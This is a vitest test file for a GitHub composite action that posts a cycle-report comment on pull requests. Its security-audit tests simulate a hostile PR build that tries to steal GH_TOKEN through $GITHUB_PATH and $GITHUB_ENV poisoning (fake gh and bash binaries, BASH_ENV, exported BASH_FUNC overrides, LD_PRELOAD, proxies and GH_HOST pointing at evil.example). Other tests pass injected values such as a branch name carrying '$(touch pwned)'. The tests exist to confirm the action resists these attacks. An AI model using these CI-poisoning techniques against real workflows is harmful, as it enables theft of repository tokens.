import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

interface Step {
  shell: string;
  env: Record<string, string>;
  run: string;
}

/** One step of a composite action.yml: its `shell:`, its `env:` (raw values) and its `run:` script, dedented. */
function step(file: string, name: string): Step {
  const lines = readFileSync(file, "utf8").replace(/\r\n/g, "\n").split("\n");
  const start = lines.findIndex((l) => l.trim() === `- name: ${name}`);
  if (start < 0) throw new Error(`${file}: no step "${name}"`);
  let end = lines.findIndex((l, i) => i > start && l.trim() !== "" && !l.startsWith("      "));
  if (end < 0) end = lines.length;
  const own = lines.slice(start + 1, end);
  const shell = own.find((l) => l.startsWith("      shell: "))?.slice(13).trim() ?? "";
  const env: Record<string, string> = {};
  const envAt = own.findIndex((l) => l === "      env:");
  if (envAt >= 0) {
    for (const l of own.slice(envAt + 1)) {
      const m = /^ {8}([A-Za-z_][A-Za-z0-9_]*): (.*)$/.exec(l);
      if (!m) break;
      env[m[1]] = m[2].replace(/^"(.*)"$/, "$1");
    }
  }
  const runAt = own.findIndex((l) => l === "      run: |");
  const body: string[] = [];
  for (const l of own.slice(runAt + 1)) {
    if (l.trim() && !l.startsWith("        ")) break;
    body.push(l.slice(8));
  }
  return { shell, env, run: body.join("\n") };
}

const bash = spawnSync("bash", ["-c", "echo ok"], { encoding: "utf8" }).stdout?.trim() === "ok";
// The bash a `/bin/bash …` shell line names: Git's bash on Windows.
const binBash =
  process.platform === "win32" && bash
    ? spawnSync("bash", ["-c", "cygpath -w /usr/bin/bash"], { encoding: "utf8" }).stdout.trim()
    : "/bin/bash";
/** A path the scripts can run: bash on Windows takes C:/… but not every tool takes C:\…. */
const posix = (p: string) => p.replace(/\\/g, "/");
const hostPath = process.env[Object.keys(process.env).find((k) => k.toUpperCase() === "PATH") ?? "PATH"];

interface Job {
  /** The job's environment, with what earlier steps wrote to $GITHUB_ENV applied. */
  env: NodeJS.ProcessEnv;
  /** Every line earlier steps wrote to $GITHUB_PATH, in order. */
  path: string[];
  /** Values of the `${{ … }}` expressions the steps use. */
  ctx: Record<string, string>;
  dir: string;
  /** Where the step runs (default: this process's). */
  cwd?: string;
}

/**
 * Runs one step as the runner does: the step's `env:` over the job's environment
 * (step env wins over $GITHUB_ENV), then the $GITHUB_PATH lines in front of PATH
 * (the runner prepends them even when the step sets PATH), with the step's shell.
 * `override` replaces step env values (test-only knobs such as RETRY_DELAY).
 * Returns the outputs the step wrote to $GITHUB_OUTPUT.
 */
function runStep(file: string, name: string, job: Job, override: Record<string, string> = {}) {
  const s = step(file, name);
  const env: NodeJS.ProcessEnv = { ...job.env };
  for (const [k, raw] of Object.entries(s.env)) {
    env[k] = raw.replace(/\$\{\{ (.+?) \}\}/g, (_, expr: string) => {
      if (!(expr in job.ctx)) throw new Error(`${name}: no test value for \${{ ${expr} }}`);
      return job.ctx[expr];
    });
  }
  Object.assign(env, override);
  env.PATH = [...[...job.path].reverse(), env.PATH].join(delimiter);
  const output = join(job.dir, `output-${Math.random().toString(36).slice(2)}`);
  writeFileSync(output, "");
  env.GITHUB_OUTPUT = output;
  const script = join(job.dir, `step-${Math.random().toString(36).slice(2)}.sh`);
  writeFileSync(script, s.run);
  let argv: string[];
  if (s.shell === "bash") argv = ["bash", "--noprofile", "--norc", "-eo", "pipefail", script];
  else {
    argv = s.shell.split(" ").map((a) => (a === "{0}" ? script : a));
    if (argv[0] === "/bin/bash") argv[0] = binBash;
  }
  const r = spawnSync(argv[0], argv.slice(1), { encoding: "utf8", env, ...(job.cwd && { cwd: job.cwd }) });
  const outputs: Record<string, string> = {};
  for (const l of readFileSync(output, "utf8").split("\n")) {
    const at = l.indexOf("=");
    if (at > 0) outputs[l.slice(0, at)] = l.slice(at + 1);
  }
  return { status: r.status, out: r.stdout + r.stderr, outputs };
}

/** What the runner does with the lines a step wrote to $GITHUB_ENV (NAME=value and NAME<<DELIM). */
function applyGithubEnv(file: string, env: NodeJS.ProcessEnv) {
  const lines = readFileSync(file, "utf8").split("\n");
  for (let i = 0; i < lines.length; i++) {
    const heredoc = /^([^=<]+)<<(.+)$/.exec(lines[i]);
    if (heredoc) {
      const body: string[] = [];
      while (++i < lines.length && lines[i] !== heredoc[2]) body.push(lines[i]);
      env[heredoc[1]] = body.join("\n");
    } else if (lines[i].includes("=")) {
      const at = lines[i].indexOf("=");
      env[lines[i].slice(0, at)] = lines[i].slice(at + 1);
    }
  }
}

/**
 * A job up to the sticky comment: a fake `gh` (on PATH before any step runs)
 * records each call and what it was given; `ids` is what the comment listing
 * prints ("FAIL" makes it fail), and PATCH fails `patchFails` times. The
 * "Resolve the comment's tools" step runs first, as in the Action.
 */
function job(dir: string, ids: string, patchFails: number): Job {
  const bin = join(dir, "bin");
  mkdirSync(bin);
  const d = posix(dir);
  // One PATH key (Windows spells it Path).
  const withoutPath = Object.fromEntries(Object.entries(process.env).filter(([k]) => k.toUpperCase() !== "PATH"));
  writeFileSync(
    join(bin, "gh"),
    [
      "#!/usr/bin/env bash",
      // gh runs with an emptied environment: what it needs is written in here.
      `echo "$*" >> '${d}/calls'`,
      `printf '%s\\n' "$GH_TOKEN" > '${d}/gh-token'`,
      `env > '${d}/gh-env'`,
      'case "$*" in',
      "  'api user'*) exit 1 ;;",
      // The pull request lookups of action/comment: what the test put in `pulls`.
      `  *repos/o/r/pulls*) [ -f '${d}/pulls' ] || exit 1; cat '${d}/pulls' ;;`,
      `  *--paginate*) [ '${ids}' != FAIL ] || exit 1; printf "%s" '${ids}' ;;`,
      `  *PATCH*) n=$(cat '${d}/patched' 2>/dev/null || echo 0); echo $((n + 1)) > '${d}/patched'; [ "$n" -ge ${patchFails} ] ;;`,
      "esac",
    ].join("\n"),
  );
  chmodSync(join(bin, "gh"), 0o755);
  writeFileSync(join(dir, "calls"), "");
  mkdirSync(join(dir, "ckb-cycles"));
  writeFileSync(join(dir, "ckb-cycles", "comment.md"), "<!-- ckb-cycles-report -->\n");
  const j: Job = {
    dir,
    path: [],
    env: { ...withoutPath, PATH: `${bin}${delimiter}${hostPath}`, RUNNER_TEMP: dir, GITHUB_WORKSPACE: dir },
    ctx: {
      "inputs.github-token": "ghs_workflow_token_with_pull_requests_write",
      "github.repository": "o/r",
      "github.event.pull_request.number": "7",
      "runner.temp": dir,
      "inputs.pr": "7",
      "inputs.markdown": join(dir, "ckb-cycles", "comment.md"),
      "inputs.head-sha": "",
      "inputs.head-owner": "",
      "inputs.head-branch": "",
      "inputs.max-bytes": "262144",
      "inputs.toolchain": "",
    },
  };
  const tools = runStep("action/action.yml", "Resolve the comment's tools", j);
  for (const [k, v] of Object.entries(tools.outputs)) j.ctx[`steps.tools.outputs.${k}`] = v;
  return j;
}

/** The sticky-comment step, after `job`. Returns the gh verbs called and the step's output. */
function post(j: Job, file = "action/action.yml") {
  const r = runStep(file, "Post the sticky comment", j, { RETRY_DELAY: "0" });
  const calls = readFileSync(join(j.dir, "calls"), "utf8").trim().split("\n");
  return { status: r.status, out: r.out, verbs: calls.map((c) => /-X (\w+)/.exec(c)?.[1]).filter(Boolean) };
}

let dir = "";
afterEach(() => dir && rmSync(dir, { recursive: true, force: true }));
const fresh = () => (dir = mkdtempSync(join(tmpdir(), "ckb-action-")));

// Each case starts bash a few times, which takes seconds on a Windows runner.
describe.skipIf(!bash)("action.yml: the sticky comment", { timeout: 60_000 }, () => {
  it("resolves gh before the build, by absolute path", () => {
    const j = job(fresh(), "", 0);
    expect(posix(j.ctx["steps.tools.outputs.gh"])).toMatch(/\/bin\/gh$/);
  });

  it("posts a new comment when there is none", () => {
    expect(post(job(fresh(), "", 0))).toMatchObject({ status: 0, verbs: ["POST"] });
    expect(readFileSync(join(dir, "gh-token"), "utf8")).toContain("ghs_workflow_token");
  });

  it("updates the existing comment, and never posts a second one when the update fails", () => {
    expect(post(job(fresh(), "11\n12", 0))).toMatchObject({ status: 0, verbs: ["PATCH"] });
    rmSync(dir, { recursive: true, force: true });
    expect(post(job(fresh(), "11", 1))).toMatchObject({ status: 0, verbs: ["PATCH", "PATCH"] });
    rmSync(dir, { recursive: true, force: true });
    const failed = post(job(fresh(), "11", 9));
    expect(failed.verbs).toEqual(["PATCH", "PATCH", "PATCH"]);
    expect(failed.out).toContain("::warning::could not update the cycle report comment 11");
  });

  it("posts nothing when the comments cannot be listed", () => {
    const r = post(job(fresh(), "FAIL", 0));
    expect(r).toMatchObject({ status: 0, verbs: [] });
    expect(r.out).toContain("::warning::could not list the pull request's comments");
  });

  it("posts nothing when the report is a symlink or missing", () => {
    const j = job(fresh(), "", 0);
    rmSync(join(dir, "ckb-cycles", "comment.md"));
    const r = post(j);
    expect(r).toMatchObject({ status: 0, verbs: [] });
    expect(r.out).toContain("::warning::no report at");
  });
});

/**
 * Security audit (30 Oct): the PR's `build` runs in the same job as the step that
 * gets `github-token`. The runner applies what a step writes to $GITHUB_PATH and
 * $GITHUB_ENV to every later step of the job. These cases run a hostile build in
 * "Report the head", apply what it wrote as the runner would, then post: the
 * token must reach only the gh resolved before the build, with none of the
 * build's variables.
 */
describe.skipIf(!bash)("action.yml: the PR's build and the comment token", { timeout: 60_000 }, () => {
  function hostile(build: string[]) {
    const j = job(fresh(), "", 0);
    const evil = posix(join(dir, "evil"));
    const githubPath = join(dir, "github_path");
    const githubEnv = join(dir, "github_env");
    writeFileSync(githubPath, "");
    writeFileSync(githubEnv, "");
    j.ctx["inputs.build"] = [
      `mkdir -p '${evil}'`,
      // Anything it can run with the token in its environment writes the token here.
      `printf '#!/bin/sh\\nprintf "%%s" "$GH_TOKEN" >> ${evil}/stolen\\n' > '${evil}/steal'`,
      `chmod +x '${evil}/steal'`,
      ...build.map((l) => l.replace(/\$EVIL/g, evil)),
    ].join("\n");
    j.ctx["inputs.config"] = "cycles.json";
    runStep("action/action.yml", "Report the head", {
      ...j,
      env: { ...j.env, GITHUB_PATH: githubPath, GITHUB_ENV: githubEnv, CKB_CYCLES: join(dir, "none.js") },
    });
    // The runner: $GITHUB_ENV into the job's environment, $GITHUB_PATH in front of PATH.
    applyGithubEnv(githubEnv, j.env);
    j.path = readFileSync(githubPath, "utf8").split("\n").filter(Boolean);
    const r = post(j);
    const stolen = existsSync(join(evil, "stolen")) ? readFileSync(join(evil, "stolen"), "utf8") : "";
    const ghEnv = readFileSync(join(dir, "gh-env"), "utf8");
    return { ...r, stolen, ghEnv, evil };
  }

  it("the PR's build cannot replace the gh that receives GH_TOKEN ($GITHUB_PATH)", () => {
    const r = hostile([
      `cp '$EVIL/steal' '$EVIL/gh'`,
      // A `shell: bash` step starts the bash found on PATH (checked on Linux: Windows starts no script as bash).
      `printf '#!/bin/sh\\n%s/steal\\nexec /bin/bash "$@"\\n' '$EVIL' > '$EVIL/bash'`,
      `chmod +x '$EVIL/bash'`,
      `echo '$EVIL' >> "$GITHUB_PATH"`,
    ]);
    expect(r.stolen).not.toContain("ghs_workflow_token");
    expect(r.verbs).toEqual(["POST"]);
    expect(readFileSync(join(dir, "gh-token"), "utf8")).toContain("ghs_workflow_token");
  });

  it("the PR's build cannot run code in the comment step through $GITHUB_ENV", () => {
    const r = hostile([
      `cp '$EVIL/steal' '$EVIL/gh'`,
      `for t in env mktemp rm sleep cat printf; do cp '$EVIL/steal' "$EVIL/$t"; done`,
      `echo 'eval "$EVIL/steal"' > '$EVIL/rc'`,
      `echo "PATH=$EVIL" >> "$GITHUB_ENV"`,
      `echo "BASH_ENV=$EVIL/rc" >> "$GITHUB_ENV"`,
      `echo "ENV=$EVIL/rc" >> "$GITHUB_ENV"`,
      `echo "SHELLOPTS=xtrace" >> "$GITHUB_ENV"`,
      // An exported function overrides a builtin of the same name.
      `printf 'BASH_FUNC_echo%%%%<<EOF\\n() { %s/steal; }\\nEOF\\n' '$EVIL' >> "$GITHUB_ENV"`,
      `printf 'BASH_FUNC_[%%%%<<EOF\\n() { %s/steal; }\\nEOF\\n' '$EVIL' >> "$GITHUB_ENV"`,
    ]);
    expect(r.stolen).not.toContain("ghs_workflow_token");
    expect(r.verbs).toEqual(["POST"]);
  });

  it("gh sees none of the build's variables: no proxy, CA, host or config of its choosing", () => {
    const r = hostile([
      `mkdir -p '$EVIL/gh-config'`,
      ...[
        "HTTPS_PROXY=http://evil.example:8080",
        "https_proxy=http://evil.example:8080",
        "ALL_PROXY=http://evil.example:8080",
        "SSL_CERT_FILE=$EVIL/ca.pem",
        "GH_HOST=evil.example",
        "GH_CONFIG_DIR=$EVIL/gh-config",
        "XDG_CONFIG_HOME=$EVIL",
        "HOME=$EVIL",
        "LD_PRELOAD=$EVIL/lib.so",
      ].map((v) => `echo '${v}' >> "$GITHUB_ENV"`),
    ]);
    expect(r.verbs).toEqual(["POST"]);
    expect(r.ghEnv).not.toContain("evil");
    expect(r.ghEnv).toMatch(/^GH_TOKEN=ghs_workflow_token/m);
  });
});

describe.skipIf(!bash)("action/comment: posting from a job that runs no PR code", { timeout: 60_000 }, () => {
  it("runs the same script as the main Action, on the markdown it is given", () => {
    for (const name of ["Resolve the comment's tools", "Post the sticky comment"]) {
      const main = step("action/action.yml", name);
      const sub = step("action/comment/action.yml", name);
      expect(sub.run).toBe(main.run);
      expect(sub.shell).toBe(main.shell);
      const { PR: _p, BODY: _b, ...rest } = sub.env;
      const { PR: _mp, BODY: _mb, ...mainRest } = main.env;
      expect(rest).toEqual(mainRest);
    }
    // What it posts, and where, is what the check step settled.
    expect(step("action/comment/action.yml", "Post the sticky comment").env).toMatchObject({
      PR: "${{ steps.check.outputs.pr }}",
      BODY: "${{ steps.check.outputs.body }}",
    });
  });

  it("posts the comment", () => {
    const j = job(fresh(), "", 0);
    expect(check(j).outputs.pr).toBe("7");
    expect(post(j, "action/comment/action.yml")).toMatchObject({ status: 0, verbs: ["POST"] });
  });
});

/** The check step of action/comment, with its outputs put where the post step reads them. */
function check(j: Job) {
  const r = runStep("action/comment/action.yml", "Check the report and the pull request", j);
  j.ctx["steps.check.outputs.pr"] = r.outputs.pr ?? "";
  j.ctx["steps.check.outputs.body"] = r.outputs.body ?? "";
  const calls = readFileSync(join(j.dir, "calls"), "utf8").trim().split("\n").filter(Boolean);
  return { ...r, calls };
}

const SHA = "0123456789abcdef0123456789abcdef01234567";

/**
 * action/comment under workflow_run: the report comes from an artifact that a pull
 * request's code wrote. It is data (checked, never run) and never says which PR it
 * is for: the PR is found from the event's head commit through the API.
 */
describe.skipIf(!bash)("action/comment: a workflow_run job and an untrusted artifact", { timeout: 60_000 }, () => {
  const fromRun = (j: Job) => {
    j.ctx["inputs.pr"] = "";
    j.ctx["inputs.head-sha"] = SHA;
    j.ctx["inputs.head-owner"] = "alice";
    j.ctx["inputs.head-branch"] = 'feat/x"; $(touch pwned) #';
    return j;
  };

  it("finds the open pull request at the run's head commit, the branch passed as a query parameter", () => {
    const j = fromRun(job(fresh(), "", 0));
    writeFileSync(join(dir, "pulls"), "12\n");
    const r = check(j);
    expect(r.status, r.out).toBe(0);
    expect(r.outputs.pr).toBe("12");
    const lookup = r.calls.find((c) => c.includes("repos/o/r/pulls")) ?? "";
    expect(lookup).toContain("-X GET repos/o/r/pulls");
    expect(lookup).toContain('head=alice:feat/x"; $(touch pwned) #');
    expect(lookup).toContain(`select(.head.sha == "${SHA}"`);
    expect(existsSync(join(dir, "pwned"))).toBe(false);
    // The lookup (GET), then the comment.
    expect(post(j, "action/comment/action.yml")).toMatchObject({ status: 0, verbs: ["GET", "POST"] });
  });

  it("posts nothing when no open pull request is at that commit any more", () => {
    const j = fromRun(job(fresh(), "", 0));
    writeFileSync(join(dir, "pulls"), "");
    const r = check(j);
    expect(r.status).toBe(0);
    expect(r.outputs.pr).toBeUndefined();
    expect(r.out).toContain("no open pull request is at");
  });

  it("checks a given PR number against the head commit", () => {
    const j = fromRun(job(fresh(), "", 0));
    j.ctx["inputs.pr"] = "7";
    writeFileSync(join(dir, "pulls"), `${SHA} o/r open\n`);
    expect(check(j).outputs.pr).toBe("7");
    writeFileSync(join(dir, "pulls"), `${"f".repeat(40)} o/r open\n`);
    const moved = check(j);
    expect(moved.outputs.pr).toBeUndefined();
    expect(moved.out).toContain("is not open at");
    writeFileSync(join(dir, "pulls"), `${SHA} someone/else open\n`);
    expect(check(j).outputs.pr).toBeUndefined();
  });

  it("refuses a head-sha or an owner that is not one", () => {
    const j = fromRun(job(fresh(), "", 0));
    writeFileSync(join(dir, "pulls"), "12\n");
    j.ctx["inputs.head-sha"] = 'x" or true';
    expect(check(j).outputs.pr).toBeUndefined();
    j.ctx["inputs.head-sha"] = SHA;
    j.ctx["inputs.head-owner"] = "a b";
    expect(check(j).outputs.pr).toBeUndefined();
    j.ctx["inputs.head-owner"] = "alice";
    expect(check(j).outputs.pr).toBe("12");
  });

  it("refuses a file that is not a report: too large, no marker, NUL bytes", () => {
    const cases: [string, Buffer | string][] = [
      ["over 262144", `<!-- ckb-cycles-report -->\n${"a".repeat(270_000)}`],
      ["not a cycle report", "hello\n<!-- ckb-cycles-report -->\n"],
      ["NUL bytes", Buffer.from("<!-- ckb-cycles-report -->\nab\0cd\n")],
    ];
    for (const [why, content] of cases) {
      const j = job(fresh(), "", 0);
      writeFileSync(join(dir, "ckb-cycles", "comment.md"), content);
      const r = check(j);
      expect(r.status, why).toBe(0);
      expect(r.outputs.pr, why).toBeUndefined();
      expect(r.out, why).toContain(why);
      expect(post(j, "action/comment/action.yml").verbs, why).toEqual([]);
      rmSync(dir, { recursive: true, force: true });
    }
    const j = job(fresh(), "", 0);
    writeFileSync(join(dir, "ckb-cycles", "comment.md"), `<!-- ckb-cycles-report -->\n${"a".repeat(200)}`);
    expect(check(j).outputs.pr).toBe("7");
    j.ctx["inputs.max-bytes"] = "100";
    expect(check(j).out).toContain("over 100");
    // A larger max-bytes is held to 262144.
    j.ctx["inputs.max-bytes"] = "999999";
    writeFileSync(join(dir, "ckb-cycles", "comment.md"), `<!-- ckb-cycles-report -->\n${"a".repeat(270_000)}`);
    expect(check(j).out).toContain("over 262144");
    // A report at its 60,000-character cap in multi-byte characters (Δ, zero-width spaces) is posted.
    j.ctx["inputs.max-bytes"] = "262144";
    writeFileSync(join(dir, "ckb-cycles", "comment.md"), `<!-- ckb-cycles-report -->\n${"Δ​".repeat(30_000)}`);
    expect(check(j).outputs.pr).toBe("7");
  });

  it("posts a copy in which no @mention or #ref links", () => {
    const j = job(fresh(), "", 0);
    const md = join(dir, "ckb-cycles", "comment.md");
    writeFileSync(md, "<!-- ckb-cycles-report -->\n### Cycle report\ncc @someone about #12 and a@b\n");
    const r = check(j);
    // The copy is in bash's /tmp, which on Windows is not C:\tmp.
    const body =
      process.platform === "win32"
        ? spawnSync("bash", ["-c", 'cygpath -w "$0"', r.outputs.body], { encoding: "utf8" }).stdout.trim()
        : r.outputs.body;
    expect(readFileSync(body, "utf8")).toBe(
      "<!-- ckb-cycles-report -->\n### Cycle report\ncc @​someone about #​12 and a@​b\n",
    );
    expect(readFileSync(md, "utf8")).toContain("@someone");
    rmSync(body, { force: true });
  });
});

describe.skipIf(!bash)("action.yml: informational", { timeout: 60_000 }, () => {
  it("a crossed threshold fails the job, unless informational", () => {
    const j: Job = { dir: fresh(), path: [], env: { ...process.env }, ctx: { "inputs.informational": "false" } };
    const failed = runStep("action/action.yml", "Fail on the thresholds", j);
    expect(failed.status).toBe(1);
    expect(failed.out).toContain("::error::cycle report");
    j.ctx["inputs.informational"] = "true";
    const r = runStep("action/action.yml", "Fail on the thresholds", j);
    expect(r.status).toBe(0);
    expect(r.out).toContain("::warning::cycle report: a threshold was crossed");
  });
});

/**
 * The "Report the base" step on a real git repository, with a stand-in for the
 * ckb-cycles CLI that records how it was called and writes a report naming the
 * scenarios of the config it was given (audit, 31 Oct: the base used the PR's
 * cycles.json, so a scenario the PR deleted was never compared or listed).
 */
describe.skipIf(!bash)("action.yml: the base report", { timeout: 60_000 }, () => {
  const git = (cwd: string, ...args: string[]) => {
    const r = spawnSync("git", args, { cwd, encoding: "utf8" });
    if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr}`);
    return r.stdout.trim();
  };
  function repo(baseConfig: string | undefined) {
    const d = fresh();
    const ws = join(d, "ws");
    mkdirSync(ws);
    git(ws, "init", "-q");
    git(ws, "config", "user.email", "t@example.com");
    git(ws, "config", "user.name", "t");
    git(ws, "config", "core.autocrlf", "false");
    writeFileSync(join(ws, "README"), "x\n");
    if (baseConfig !== undefined) writeFileSync(join(ws, "cycles.json"), baseConfig);
    git(ws, "add", ".");
    git(ws, "commit", "-q", "-m", "base");
    const base = git(ws, "rev-parse", "HEAD");
    // The PR keeps one scenario and deletes the other.
    writeFileSync(join(ws, "cycles.json"), JSON.stringify({ scenarios: [{ name: "kept", mock: "m.json" }] }));
    git(ws, "add", ".");
    git(ws, "commit", "-q", "-m", "head");
    const cli = join(d, "fake-cli.mjs");
    writeFileSync(
      cli,
      [
        'import { appendFileSync, readFileSync, writeFileSync } from "node:fs";',
        "const args = process.argv.slice(2);",
        `appendFileSync(${JSON.stringify(join(d, "cli-calls"))}, JSON.stringify(args) + "\\n");`,
        "const config = JSON.parse(readFileSync(args[1], \"utf8\"));",
        "const scenarios = config.scenarios.map((s) => ({ name: s.name, groups: [] }));",
        'writeFileSync(args[args.indexOf("--json") + 1], JSON.stringify({ tool: "ckb-cycles", version: 1, scenarios }));',
      ].join("\n"),
    );
    mkdirSync(join(d, "ckb-cycles"));
    const j: Job = {
      dir: d,
      cwd: ws,
      path: [],
      env: { ...process.env, RUNNER_TEMP: posix(d), GITHUB_WORKSPACE: posix(ws), CKB_CYCLES: posix(cli) },
      ctx: { "inputs.build": "", "inputs.config": "cycles.json", "inputs.base-ref": base, "inputs.base-config": "base", "inputs.toolchain": "" },
    };
    return { j, d };
  }
  const calls = (d: string) =>
    existsSync(join(d, "cli-calls"))
      ? readFileSync(join(d, "cli-calls"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as string[])
      : [];

  it("measures the base with the base commit's own cycles.json, inside the base checkout", () => {
    const { j, d } = repo(JSON.stringify({ scenarios: [{ name: "kept", mock: "m.json" }, { name: "deleted", mock: "d.json" }] }));
    const r = runStep("action/action.yml", "Report the base", j);
    expect(r.status, r.out).toBe(0);
    const base = JSON.parse(readFileSync(join(d, "ckb-cycles", "base.json"), "utf8"));
    // The scenario the PR deleted is in the base report, so the diff lists it as removed.
    expect(base.scenarios.map((s: { name: string }) => s.name)).toEqual(["kept", "deleted"]);
    const [call] = calls(d);
    expect(call.slice(0, 2)).toEqual(["report", `${posix(d)}/ckb-cycles/base/cycles.json`]);
    expect(call).not.toContain("--binaries-from");
    expect(call.filter((a, i) => call[i - 1] === "--root")).toEqual([`${posix(d)}/ckb-cycles/base`]);
  });

  it("with base-config: head, measures the base with the PR's cycles.json and the base checkout's binaries", () => {
    const { j, d } = repo(JSON.stringify({ scenarios: [{ name: "kept", mock: "m.json" }, { name: "deleted", mock: "d.json" }] }));
    j.ctx["inputs.base-config"] = "head";
    const r = runStep("action/action.yml", "Report the base", j);
    expect(r.status, r.out).toBe(0);
    const base = JSON.parse(readFileSync(join(d, "ckb-cycles", "base.json"), "utf8"));
    expect(base.scenarios.map((s: { name: string }) => s.name)).toEqual(["kept"]);
    const [call] = calls(d);
    expect(call.slice(0, 2)).toEqual(["report", "cycles.json"]);
    expect(call[call.indexOf("--binaries-from") + 1]).toBe(`${posix(d)}/ckb-cycles/base`);
    expect(call.filter((a, i) => call[i - 1] === "--root")).toEqual([posix(join(d, "ws")), `${posix(d)}/ckb-cycles/base`]);
  });

  it("with base-config: head, a base without a cycles.json is still measured (the config is generated)", () => {
    const { j, d } = repo(undefined);
    j.ctx["inputs.base-config"] = "head";
    expect(runStep("action/action.yml", "Report the base", j).status).toBe(0);
    const base = JSON.parse(readFileSync(join(d, "ckb-cycles", "base.json"), "utf8"));
    expect(base.scenarios.map((s: { name: string }) => s.name)).toEqual(["kept"]);
  });

  it("refuses a base-config that is neither base nor head", () => {
    const { j } = repo(undefined);
    j.ctx["inputs.base-config"] = "pr";
    const r = runStep("action/action.yml", "Report the base", j);
    expect(r.status).toBe(1);
    expect(r.out).toContain("base-config is base or head");
  });

  // The manifest's toolchain: the command's output, run inside each checkout after its build.
  it("records the toolchain each checkout reports, and nothing when the command fails", () => {
    for (const baseConfig of ["base", "head"]) {
      const { j, d } = repo(JSON.stringify({ scenarios: [{ name: "kept", mock: "m.json" }, { name: "deleted", mock: "d.json" }] }));
      j.ctx["inputs.base-config"] = baseConfig;
      j.ctx["inputs.toolchain"] = "echo \"rustc in $(basename \"$PWD\")\"";
      expect(runStep("action/action.yml", "Report the base", j).status).toBe(0);
      const [call] = calls(d);
      expect(call[call.indexOf("--toolchain") + 1]).toBe("rustc in base");
    }
    const { j, d } = repo(JSON.stringify({ scenarios: [{ name: "kept", mock: "m.json" }, { name: "deleted", mock: "d.json" }] }));
    j.ctx["inputs.toolchain"] = "exit 3";
    const r = runStep("action/action.yml", "Report the base", j);
    expect(r.status).toBe(0);
    expect(r.out).toContain("::warning::the toolchain command failed on the base");
    expect(calls(d)[0]).not.toContain("--toolchain");
  });

  it("records the head's toolchain from the PR checkout", () => {
    const { j, d } = repo(undefined);
    j.ctx["inputs.toolchain"] = "echo \"rustc in $(basename \"$PWD\")\"";
    expect(runStep("action/action.yml", "Report the head", j).status).toBe(0);
    const [call] = calls(d);
    expect(call.slice(0, 2)).toEqual(["report", "cycles.json"]);
    expect(call[call.indexOf("--toolchain") + 1]).toBe("rustc in ws");
  });

  it("writes an empty base report when the base has no cycles.json (the PR adds it)", () => {
    const { j, d } = repo(undefined);
    const r = runStep("action/action.yml", "Report the base", j);
    expect(r.status, r.out).toBe(0);
    expect(JSON.parse(readFileSync(join(d, "ckb-cycles", "base.json"), "utf8")).scenarios).toEqual([]);
    expect(calls(d)).toEqual([]);
  });
});
